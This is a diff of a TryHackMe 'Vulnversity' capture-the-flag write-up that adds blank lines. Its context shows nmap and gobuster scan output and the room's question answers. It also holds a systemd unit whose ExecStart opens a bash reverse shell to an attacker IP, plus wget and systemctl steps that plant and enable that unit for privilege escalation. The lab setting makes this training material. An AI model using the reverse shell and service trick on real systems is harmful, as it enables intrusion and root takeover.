@@ -26,6 +26,7 @@ Room Link: [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/v
 Output of the command:
 
 ```bash
+
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 09:55 IST
 Nmap scan report for 10.10.135.130
 Host is up (0.20s latency).
@@ -42,6 +43,7 @@ Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_ke
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 36.77 seconds
 ```
+
 - Question `how many ports are open?` Answer `6`
 - Question `What version of the squid proxy is running on the machine?` Answer `3.5.12`
 - Question `How many ports will Nmap scan if the flag -p-400 was used?` Answer `400`
@@ -57,6 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 36.77 seconds
 Output of the command: 
 
 ```bash
+
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -78,6 +81,7 @@ Starting gobuster in directory enumeration mode
 /internal             (Status: 301) [Size: 320] [--> http://10.10.65.81:3333/internal/]
 Progress: 9932 / 1273834 (0.78%)
 ```
+
 - Question `What is the directory that has an upload form page?` Answer `/internal/`
 
 ## Compromise the Webserver 
@@ -98,6 +102,7 @@ Progress: 9932 / 1273834 (0.78%)
 - At first I created a file on my machine named ZishanAdThander.service (with my ip, you can user your ip)
 
 ```bash
+
 [Unit]
 Description=ZishanAdThandar
 
@@ -109,6 +114,7 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.102.105/1337 0>&1'
 [Install]
 WantedBy=multi-user.target
 ```
+
 - Now started web server on my machine using `python3 -m http.server 7860`
 - On the reverse shell, moved to `/tmp` directory using `cd /tmp` command. Then uploaded the file with `wget http://10.17.102.105:7860/ZishanAdThandar.service` command.
 - Now we can add the service using `/bin/systemctl enable /tmp/ZishanAdThandar.service` command on reverse shell.
